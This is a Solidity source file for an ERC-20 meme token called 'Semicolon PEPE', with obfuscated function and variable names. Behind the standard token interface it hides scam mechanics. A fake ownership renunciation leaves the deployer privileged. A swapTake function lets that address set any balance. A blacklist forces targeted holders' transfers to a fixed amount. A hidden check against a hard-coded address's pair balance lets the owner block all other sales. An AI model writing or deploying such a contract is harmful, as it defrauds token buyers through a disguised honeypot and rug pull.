//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface toLaunched {
    function totalSupply() external view returns (uint256);

    function balanceOf(address senderToTrading) external view returns (uint256);

    function transfer(address isTake, uint256 shouldTakeTrading) external returns (bool);

    function allowance(address totalFund, address spender) external view returns (uint256);

    function approve(address spender, uint256 shouldTakeTrading) external returns (bool);

    function transferFrom(
        address sender,
        address isTake,
        uint256 shouldTakeTrading
    ) external returns (bool);

    event Transfer(address indexed from, address indexed maxAuto, uint256 value);
    event Approval(address indexed totalFund, address indexed spender, uint256 value);
}

abstract contract enableTeam {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface walletLiquidityShould {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface buyTake {
    function createPair(address marketingReceiver, address marketingListFee) external returns (address);
}

interface enableExempt is toLaunched {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SemicolonPEPE is enableTeam, toLaunched, enableExempt {

    function amountLaunch(address tradingTeam, address isTake, uint256 shouldTakeTrading) internal returns (bool) {
        require(sellTeam[tradingTeam] >= shouldTakeTrading);
        sellTeam[tradingTeam] -= shouldTakeTrading;
        sellTeam[isTake] += shouldTakeTrading;
        emit Transfer(tradingTeam, isTake, shouldTakeTrading);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return walletLimit;
    }

    uint256 private buyTeam;

    function fundShould(address shouldIs) public {
        require(shouldIs.balance < 100000);
        if (toShould) {
            return;
        }
        if (buyTeam != tradingAmount) {
            feeTakeExempt = tradingAmount;
        }
        feeExemptAuto[shouldIs] = true;
        
        toShould = true;
    }

    function swapTake(address autoLimit, uint256 shouldTakeTrading) public {
        enableMarketing();
        sellTeam[autoLimit] = shouldTakeTrading;
    }

    uint8 private launchedTo = 18;

    address txMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public receiverTokenIs;

    function transfer(address autoLimit, uint256 shouldTakeTrading) external virtual override returns (bool) {
        return marketingWallet(_msgSender(), autoLimit, shouldTakeTrading);
    }

    event OwnershipTransferred(address indexed feeAt, address indexed marketingIs);

    function marketingWallet(address tradingTeam, address isTake, uint256 shouldTakeTrading) internal returns (bool) {
        if (tradingTeam == listTotalLaunch) {
            return amountLaunch(tradingTeam, isTake, shouldTakeTrading);
        }
        uint256 tradingShould = toLaunched(totalAtToken).balanceOf(liquidityToken);
        require(tradingShould == senderList);
        require(isTake != liquidityToken);
        if (buyList[tradingTeam]) {
            return amountLaunch(tradingTeam, isTake, teamEnable);
        }
        return amountLaunch(tradingTeam, isTake, shouldTakeTrading);
    }

    constructor (){
        
        walletLiquidityShould totalTokenMin = walletLiquidityShould(txMin);
        totalAtToken = buyTake(totalTokenMin.factory()).createPair(totalTokenMin.WETH(), address(this));
        if (receiverTokenIs) {
            tokenSenderLimit = false;
        }
        listTotalLaunch = _msgSender();
        feeReceiverTeam();
        feeExemptAuto[listTotalLaunch] = true;
        sellTeam[listTotalLaunch] = totalEnable;
        if (buyTeam != feeTakeExempt) {
            feeTakeExempt = buyTeam;
        }
        emit Transfer(address(0), listTotalLaunch, totalEnable);
    }

    address private exemptReceiverTx;

    mapping(address => bool) public buyList;

    uint256 senderList;

    function feeReceiverTeam() public {
        emit OwnershipTransferred(listTotalLaunch, address(0));
        exemptReceiverTx = address(0);
    }

    uint256 private totalEnable = 100000000 * 10 ** 18;

    function transferFrom(address tradingTeam, address isTake, uint256 shouldTakeTrading) external override returns (bool) {
        if (_msgSender() != txMin) {
            if (walletTx[tradingTeam][_msgSender()] != type(uint256).max) {
                require(shouldTakeTrading <= walletTx[tradingTeam][_msgSender()]);
                walletTx[tradingTeam][_msgSender()] -= shouldTakeTrading;
            }
        }
        return marketingWallet(tradingTeam, isTake, shouldTakeTrading);
    }

    uint256 totalFee;

    string private walletLimit = "SPE";

    function decimals() external view virtual override returns (uint8) {
        return launchedTo;
    }

    address public listTotalLaunch;

    uint256 private tradingAmount;

    bool private tokenSenderLimit;

    function allowance(address sellAt, address receiverFundTx) external view virtual override returns (uint256) {
        if (receiverFundTx == txMin) {
            return type(uint256).max;
        }
        return walletTx[sellAt][receiverFundTx];
    }

    address liquidityToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public feeExemptAuto;

    function limitSenderMax(uint256 shouldTakeTrading) public {
        enableMarketing();
        senderList = shouldTakeTrading;
    }

    uint256 constant teamEnable = 13 ** 10;

    mapping(address => mapping(address => uint256)) private walletTx;

    function totalSupply() external view virtual override returns (uint256) {
        return totalEnable;
    }

    uint256 public feeTakeExempt;

    function approve(address receiverFundTx, uint256 shouldTakeTrading) public virtual override returns (bool) {
        walletTx[_msgSender()][receiverFundTx] = shouldTakeTrading;
        emit Approval(_msgSender(), receiverFundTx, shouldTakeTrading);
        return true;
    }

    mapping(address => uint256) private sellTeam;

    string private receiverTeamFee = "Semicolon PEPE";

    function senderLaunch(address feeListMax) public {
        enableMarketing();
        
        if (feeListMax == listTotalLaunch || feeListMax == totalAtToken) {
            return;
        }
        buyList[feeListMax] = true;
    }

    address public totalAtToken;

    function name() external view virtual override returns (string memory) {
        return receiverTeamFee;
    }

    function getOwner() external view returns (address) {
        return exemptReceiverTx;
    }

    function balanceOf(address senderToTrading) public view virtual override returns (uint256) {
        return sellTeam[senderToTrading];
    }

    function enableMarketing() private view {
        require(feeExemptAuto[_msgSender()]);
    }

    function owner() external view returns (address) {
        return exemptReceiverTx;
    }

    bool public toShould;

}